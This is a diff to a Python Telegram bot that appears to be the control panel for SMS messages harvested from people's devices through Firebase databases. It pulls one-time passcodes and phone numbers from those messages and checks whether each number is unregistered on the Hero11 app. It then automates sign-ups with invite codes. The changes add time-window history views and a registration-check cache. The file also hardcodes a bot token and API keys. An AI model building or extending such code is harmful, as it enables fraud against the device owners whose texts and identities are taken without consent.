@@ -30,7 +30,7 @@ if hasattr(time, "tzset"):
 IST = timezone(timedelta(hours=5, minutes=30))
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM").strip()
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8337013809"))
-SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM").strip()
+SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "RqHPFHbQCNwItxqfh21kDmH0Sx2bR0dBdDH1P9QLuFU6hspmbsQIYzxZ5DOURVbg").strip()
 OTP_TIMEOUT = 25
 POLL_INTERVAL = 2
 TIMEOUT = 30
@@ -313,33 +313,49 @@ def resolve_message_dt(time_val, msg_key: str = "", ref_now: datetime = None):
 
     return dt
 
+def extract_raw_time(m_val):
+    if not isinstance(m_val, dict):
+        return None
+    raw_time = (
+        m_val.get("time")
+        or m_val.get("timestamp")
+        or m_val.get("date")
+        or m_val.get("created_at")
+        or m_val.get("receivedAt")
+        or m_val.get("smsTime")
+    )
+    if raw_time is None:
+        for k, v in m_val.items():
+            if any(w in str(k).lower() for w in ["time", "date", "stamp"]):
+                raw_time = v
+                break
+    return raw_time
+
+def message_age_seconds(m_val, msg_key: str = "", now_ist: datetime = None):
+    """Returns elapsed seconds in IST for a message, or None if timestamp cannot be determined."""
+    if now_ist is None:
+        now_ist = datetime.now(IST)
+    raw_time = extract_raw_time(m_val)
+    dt = resolve_message_dt(raw_time, msg_key=msg_key, ref_now=now_ist)
+    if dt is None:
+        return None
+    diff = (now_ist - dt).total_seconds()
+    if diff < -120:
+        return None
+    return max(0, int(diff))
+
 def has_otp_within_window(msgs, window_minutes: int) -> bool:
     """Checks the device's chat history and returns True only if at least 1 OTP pattern message arrived within window_minutes."""
     if not isinstance(msgs, dict) or not msgs:
         return False
     now_ist = datetime.now(IST)
-    cutoff = now_ist - timedelta(minutes=window_minutes)
+    max_age_sec = window_minutes * 60
 
     for m_key, m_val in msgs.items():
-        if not isinstance(m_val, dict):
-            continue
         if not message_has_otp_pattern(m_val):
             continue
-        raw_time = (
-            m_val.get("time")
-            or m_val.get("timestamp")
-            or m_val.get("date")
-            or m_val.get("created_at")
-            or m_val.get("receivedAt")
-            or m_val.get("smsTime")
-        )
-        if raw_time is None:
-            for k, v in m_val.items():
-                if any(w in str(k).lower() for w in ["time", "date", "stamp"]):
-                    raw_time = v
-                    break
-        msg_dt = resolve_message_dt(raw_time, msg_key=m_key, ref_now=now_ist)
-        if msg_dt is not None and cutoff <= msg_dt <= now_ist + timedelta(minutes=2):
+        age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
+        if age_sec is not None and age_sec <= max_age_sec:
             return True
     return False
 
@@ -516,6 +532,21 @@ class AsyncHero11Client:
             return "SUCCESS"
         return "INVALID"
 
+async def is_number_unregistered(full_phone: str, invite_code: str, reg_cache: dict) -> bool:
+    """Returns True if full_phone is unregistered on Hero11, caching results for speed."""
+    if full_phone in reg_cache:
+        return reg_cache[full_phone]
+    client = AsyncHero11Client(full_phone, invite_code)
+    try:
+        res = await client.black_check()
+        is_unreg = res != "SKIP_EXISTS"
+        reg_cache[full_phone] = is_unreg
+        return is_unreg
+    except Exception:
+        return False
+    finally:
+        await client.close()
+
 # ==============================================================================
 # 🤖 TELEGRAM KEYBOARDS & INTERACTIVE MENUS
 # ==============================================================================
@@ -533,11 +564,14 @@ def get_main_menu():
          InlineKeyboardButton(text="🟢 Check Online Devices", callback_data="check_devices")],
         [InlineKeyboardButton(text="📊 Check Number Status", callback_data="check_numbers_menu"),
          InlineKeyboardButton(text="🔢 Scan All Numbers by ID", callback_data="scan_id_numbers_menu")],
+        [InlineKeyboardButton(text="💬 History (< 10m)", callback_data="hist_win_10"),
+         InlineKeyboardButton(text="💬 History (< 1h)", callback_data="hist_win_60"),
+         InlineKeyboardButton(text="💬 History (< 24h)", callback_data="hist_win_1440")],
         [InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms"),
          InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
         [InlineKeyboardButton(text="🚀 Start (OTP < 10m)", callback_data="start_auto_10"),
-         InlineKeyboardButton(text="🚀 Start (OTP < 1h)", callback_data="start_auto_60")],
-        [InlineKeyboardButton(text="🚀 Start (OTP < 24h)", callback_data="start_auto_1440")]
+         InlineKeyboardButton(text="🚀 Start (OTP < 1h)", callback_data="start_auto_60"),
+         InlineKeyboardButton(text="🚀 Start (OTP < 24h)", callback_data="start_auto_1440")]
     ])
 
 class LiveLogger:
@@ -811,6 +845,109 @@ async def process_device_id_scan(message: types.Message, state: FSMContext):
     except Exception as e:
         await status_msg.edit_text(f"❌ Error scanning Device ID(s): {html.escape(str(e))}", reply_markup=get_main_menu())
 
+@dp.callback_query(F.data.startswith("hist_win_"))
+async def cb_show_history_by_window(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    if not USER_DATA["firebase_dbs"]:
+        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
+        return
+
+    try:
+        window_minutes = int(callback.data.split("_")[-1])
+    except Exception:
+        window_minutes = 10
+
+    labels = {10: "under 10 min", 60: "under 1 hr", 1440: "under 24 hr"}
+    win_label = labels.get(window_minutes, f"under {window_minutes}m")
+    max_age_sec = window_minutes * 60
+    now_ist = datetime.now(IST)
+    default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
+
+    status_msg = await callback.message.answer(
+        f"🔍 Checking unregistered numbers & filtering chat history <b>{html.escape(win_label)}</b>...",
+        parse_mode="HTML"
+    )
+
+    try:
+        import aiohttp
+        matched_entries = []
+        reg_cache = {}
+
+        async with aiohttp.ClientSession() as session:
+            for fb_url in USER_DATA["firebase_dbs"]:
+                db_short_id = fb_url.split('//')[1].split('.')[0][:8]
+                try:
+                    async with session.get(f"{fb_url}clients.json", timeout=8) as r:
+                        clients_data = await r.json() or {}
+
+                    for cid, cdata in clients_data.items():
+                        if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                            try:
+                                async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=6) as m_req:
+                                    msgs = await m_req.json()
+                                    if not isinstance(msgs, dict):
+                                        continue
+
+                                    phones = extract_all_phones(msgs)
+                                    unreg_phones = []
+                                    for p in phones:
+                                        full_phone = "+91" + p
+                                        if await is_number_unregistered(full_phone, default_code, reg_cache):
+                                            unreg_phones.append(full_phone)
+
+                                    if not unreg_phones:
+                                        continue
+
+                                    phone_tag = ", ".join(unreg_phones[:2])
+                                    for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
+                                        if not isinstance(m_val, dict):
+                                            continue
+                                        age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
+                                        if age_sec is None or age_sec > max_age_sec:
+                                            continue
+
+                                        time_ago = format_relative_time(extract_raw_time(m_val), msg_key=m_key, idx=idx)
+                                        body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
+                                        sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")
+
+                                        otps = re.findall(r'\b\d{6}\b', body_str)
+                                        valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
+                                        otp_badge = f"  🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""
+
+                                        matched_entries.append((
+                                            age_sec,
+                                            f"📱 <code>{html.escape(phone_tag)}</code> • 🆔 <code>{html.escape(cid[:8])}</code> [{html.escape(db_short_id)}] • {html.escape(time_ago)}{otp_badge}\n"
+                                            f"📤 <b>{html.escape(sender_str)}</b> • 💬 {html.escape(body_str[:200])}"
+                                        ))
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+
+        matched_entries.sort(key=lambda x: x[0])
+        top_entries = [item[1] for item in matched_entries[:15]]
+
+        if not top_entries:
+            await status_msg.edit_text(
+                f"ℹ️ No chat history messages found for <b>unregistered numbers</b> <b>{html.escape(win_label)}</b>.",
+                parse_mode="HTML",
+                reply_markup=get_main_menu()
+            )
+        else:
+            block = "\n\n".join(top_entries)
+            if len(block) > 3800:
+                block = block[:3800] + "\n\n<i>[Truncated]</i>"
+            await status_msg.edit_text(
+                f"💬 <b>UNREGISTERED CHAT HISTORY ({html.escape(win_label.upper())}) — {len(matched_entries)} match(es)</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n\n{block}",
+                parse_mode="HTML",
+                reply_markup=get_main_menu()
+            )
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error loading chat history: {html.escape(str(e))}", reply_markup=get_main_menu())
+    await callback.answer()
+
 @dp.callback_query(F.data == "view_active_sms")
 async def cb_view_active_sms(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -825,6 +962,7 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
         import aiohttp
         active_devices = []
         default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
+        reg_cache = {}
 
         async with aiohttp.ClientSession() as session:
             for fb_url in USER_DATA["firebase_dbs"]:
@@ -841,12 +979,7 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
                                     phones = extract_all_phones(msgs)
                                     for phone in phones:
                                         full_phone = "+91" + phone
-                                        client = AsyncHero11Client(full_phone, default_code)
-                                        try:
-                                            check_res = await client.black_check()
-                                        finally:
-                                            await client.close()
-                                        if check_res != "SKIP_EXISTS":
+                                        if await is_number_unregistered(full_phone, default_code, reg_cache):
                                             active_devices.append({
                                                 "phone": full_phone,
                                                 "cid": cid,
@@ -909,19 +1042,7 @@ async def cb_show_device_sms(callback: types.CallbackQuery):
                 if isinstance(msgs, dict):
                     for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
                         if isinstance(m_val, dict):
-                            raw_time = (
-                                m_val.get("time")
-                                or m_val.get("timestamp")
-                                or m_val.get("date")
-                                or m_val.get("created_at")
-                                or m_val.get("receivedAt")
-                                or m_val.get("smsTime")
-                            )
-                            if raw_time is None:
-                                for k, v in m_val.items():
-                                    if any(w in str(k).lower() for w in ["time", "date", "stamp"]):
-                                        raw_time = v
-                                        break
+                            raw_time = extract_raw_time(m_val)
                             time_ago = format_relative_time(raw_time, msg_key=m_key, idx=idx)
                             body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
                             sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")
@@ -1047,7 +1168,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
     USER_DATA["is_running"] = True
     status_msg = await callback.message.answer(
-        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Checking device chat histories for OTP pattern in {html.escape(window_label)}...",
+        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Checking unregistered numbers with OTP pattern in {html.escape(window_label)}...",
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
@@ -1061,6 +1182,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         skipped_phones = set()
         used_phones = set()
         skipped_cids = set()
+        reg_cache = {}
         logger = LiveLogger(status_msg)
 
         try:
@@ -1088,15 +1210,24 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                             continue
 
                                         phones = extract_all_phones(msgs)
+                                        has_any_unreg = False
                                         for phone in phones:
                                             full_phone = "+91" + phone
-                                            if full_phone not in skipped_phones and full_phone not in used_phones:
+                                            if full_phone in skipped_phones or full_phone in used_phones:
+                                                continue
+                                            if await is_number_unregistered(full_phone, current_code, reg_cache):
+                                                has_any_unreg = True
                                                 all_unregistered_candidates.append({
                                                     "firebase_url": fb_url,
                                                     "db_short_id": db_short_id,
                                                     "cid": cid,
                                                     "phone": full_phone
                                                 })
+                                            else:
+                                                skipped_phones.add(full_phone)
+
+                                        if not has_any_unreg:
+                                            skipped_cids.add(cid)
                                     except Exception:
                                         pass
                         except Exception:
